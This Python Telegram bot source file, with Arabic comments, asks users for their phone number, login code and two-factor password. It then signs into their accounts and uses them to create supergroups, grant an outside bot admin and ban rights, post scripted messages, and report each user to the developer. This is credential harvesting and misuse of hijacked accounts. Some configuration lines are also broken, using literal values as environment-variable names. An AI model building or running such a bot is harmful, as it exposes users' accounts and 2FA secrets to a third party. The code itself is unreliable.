import os
import asyncio
from telethon import TelegramClient, events, Button, functions, types
from telethon.sessions import StringSession

# ---------- إعدادات ----------
api_id = int(os.environ.get("API_ID"))
api_hash = os.environ.get("API_HASH")
bot_token = os.environ.get("BOT_TOKEN")

force_channel = os.environ.get("Qd3Qd")  # بدون @
developer_username = os.environ.get("E2E12")  # بدون @
developer_id = int(os.environ.get("5581457665"))  # ID حساب المطور

admin_bot_username = os.environ.get("ADMIN_BOT_USERNAME", "czbbbot")

groups_per_user = int(os.environ.get("GROUPS_PER_USER", 2))
delay_between_groups = int(os.environ.get("DELAY_BETWEEN_GROUPS", 5))

session_string = os.environ.get("SESSION_STRING")

bot = TelegramClient("bot", api_id, api_hash).start(bot_token=bot_token)
dev_client = TelegramClient(StringSession(session_string), api_id, api_hash)

sessions = {}

# ---------- إشعار المطور ----------
async def notify_dev(user, success_count):
    try:
        username = f"@{user.username}" if user.username else "لا يوجد"
        msg = (
            f"😂👤 مستخدم جديد دخل البوت!\n\n"
            f"🆔 ID: `{user.id}`\n"
            f"🔗 Username: {username}\n"
            f"🙂📦 عدد المجموعات: {success_count}"
        )
        await bot.send_message(developer_id, msg)
    except Exception as e:
        print(f"[FAILED] لم يتم إرسال إشعار للمطور: {e}")

# ---------- فحص الاشتراك ----------
async def is_subscribed(user_id):
    try:
        await bot(functions.channels.GetParticipantRequest(
            channel=force_channel,
            participant=user_id
        ))
        return True
    except:
        return False

# ---------- إنشاء مجموعة ----------
async def create_supergroup(client, title="AutoGroup"):
    try:
        result = await client(functions.channels.CreateChannelRequest(
            title=title,
            about="تم الإنشاء بواسطة البوت",
            megagroup=True
        ))
        return result.chats[0]
    except Exception as e:
        print(f"[FAILED] لم يتم إنشاء المجموعة: {e}")
        return None

# ---------- إضافة البوت كمشرف ----------
async def invite_admin_bot(client, channel):
    try:
        bot_entity = await client.get_entity(f"@{admin_bot_username}")
        await client(functions.channels.InviteToChannelRequest(
            channel=channel,
            users=[bot_entity]
        ))
        rights = types.ChannelAdminRights(
            change_info=True, post_messages=True, edit_messages=True,
            delete_messages=True, ban_users=True, invite_users=True,
            pin_messages=True, add_admins=False
        )
        await client(functions.channels.EditAdminRequest(
            channel=channel,
            user_id=bot_entity,
            admin_rights=rights,
            rank="Moderator"
        ))
    except Exception as e:
        print(f"[FAILED] ترقية البوت: {e}")

# ---------- إرسال رسائل ----------
messages_to_send = ["هلوو", "شلونكم", "شني @e2e12", "يلاا", "ميخالف"]

async def send_messages(client, channel):
    for msg in messages_to_send:
        try:
            await client.send_message(channel, msg)
            await asyncio.sleep(1)
        except Exception as e:
            print(f"[FAILED] إرسال {msg}: {e}")

# ---------- /start ----------
@bot.on(events.NewMessage(pattern="/start"))
async def start_handler(event):
    user_id = event.sender_id

    # التحقق من الاشتراك الإجباري
    if not await is_subscribed(user_id):
        await event.respond(
            f"🚨 للاستخدام، اشترك أولاً :\n👉 https://t.me/{force_channel}\n\nثم أرسل /start ."
        )
        return

    # لو المستخدم هو المطور
    if user_id == developer_id:
        buttons = [
            [Button.inline("😂🛠️ إنشاء من حساب المطور", data="create_dev")],
            [Button.inline("👤 إنشاء من حسابي", data="create_user")],
            [Button.url("👨‍💻 Div", f"https://t.me/{developer_username}")]
        ]
    else:
        buttons = [
            [Button.inline("👤 إنشاء من حسابي", data="create_user")],
            [Button.url("👨‍💻 Div", f"https://t.me/{developer_username}")]
        ]

    await event.respond("👋 أهلاً بك! اختر الوضع:", buttons=buttons)
# ---------- وضع المطور ----------
@bot.on(events.CallbackQuery(data=b"create_dev"))
async def callback_create_dev(event):
    await dev_client.start()
    success = 0
    for i in range(groups_per_user):
        title = f"DevGroup_{event.sender_id}_{i}"
        group = await create_supergroup(dev_client, title)
        if group:
            success += 1
            await invite_admin_bot(dev_client, group)
            await send_messages(dev_client, group)
        await asyncio.sleep(delay_between_groups)
    await event.respond(f"😂✅ تم إنشاء {success} مجموعة من حساب المطور.")

# ---------- وضع المستخدم ----------
@bot.on(events.CallbackQuery(data=b"create_user"))
async def callback_create_user(event):
    sessions[event.sender_id] = {"step": "phone"}
    await event.respond("📞 أرسل رقم هاتفك (بصيغة +964...)")

@bot.on(events.NewMessage)
async def user_login_flow(event):
    user_id = event.sender_id
    if user_id not in sessions:
        return

    step = sessions[user_id].get("step")

    # إدخال الهاتف
    if step == "phone":
        phone = event.raw_text.strip()
        client = TelegramClient(StringSession(), api_id, api_hash)
        await client.connect()
        try:
            await client.send_code_request(phone)
            sessions[user_id] = {"step": "code", "phone": phone, "client": client}
            await event.respond("!📩 أرسل رمز التأكيد.")
        except Exception as e:
            await event.respond(f"!❌ خطأ: {e}")

    # إدخال الكود
    elif step == "code":
        code = event.raw_text.strip()
        client = sessions[user_id]["client"]
        phone = sessions[user_id]["phone"]
        try:
            await client.sign_in(phone=phone, code=code)
            session_string = client.session.save()
            sessions[user_id] = {"step": "done", "session": session_string}
            await event.respond("😂✅ تم تسجيل الدخول! جاري إنشاء المجموعات...")

            success = 0
            user_client = TelegramClient(StringSession(session_string), api_id, api_hash)
            await user_client.start()
            for i in range(groups_per_user):
                title = f"UserGroup_{user_id}_{i}"
                group = await create_supergroup(user_client, title)
                if group:
                    success += 1
                    await invite_admin_bot(user_client, group)
                    await send_messages(user_client, group)
                await asyncio.sleep(delay_between_groups)

            await event.respond(f"😂✅ تم إنشاء {success} مجموعة من حسابك.")
            # إشعار المطور
            user = await bot.get_entity(user_id)
            await notify_dev(user, success)
        except Exception as e:
            if "SESSION_PASSWORD_NEEDED" in str(e):
                sessions[user_id]["step"] = "password"
                await event.respond("🙂🔒 الحساب محمي بكلمة مرور 2FA. أرسل كلمة المرور.")
            else:
                await event.respond(f"❌ خطأ: {e}")

    # إدخال كلمة مرور 2FA
    elif step == "password":
        password = event.raw_text.strip()
        client = sessions[user_id]["client"]
        try:
            await client.sign_in(password=password)
            session_string = client.session.save()
            sessions[user_id] = {"step": "done", "session": session_string}
            await event.respond("✅ تم تسجيل الدخول! جاري إنشاء المجموعات...")

            success = 0
            user_client = TelegramClient(StringSession(session_string), api_id, api_hash)
            await user_client.start()
            for i in range(groups_per_user):
                title = f"UserGroup_{user_id}_{i}"
                group = await create_supergroup(user_client, title)
                if group:
                    success += 1
                    await invite_admin_bot(user_client, group)
                    await send_messages(user_client, group)
                await asyncio.sleep(delay_between_groups)

            await event.respond(f"😂✅ تم إنشاء {success} مجموعة من حسابك.")
            # إشعار المطور
            user = await bot.get_entity(user_id)
            await notify_dev(user, success)
        except Exception as e:
            await event.respond(f"❌ كلمة مرور خاطئة يحلوو: {e}")

print("🤖 Bot is running...")
bot.run_until_disconnected()
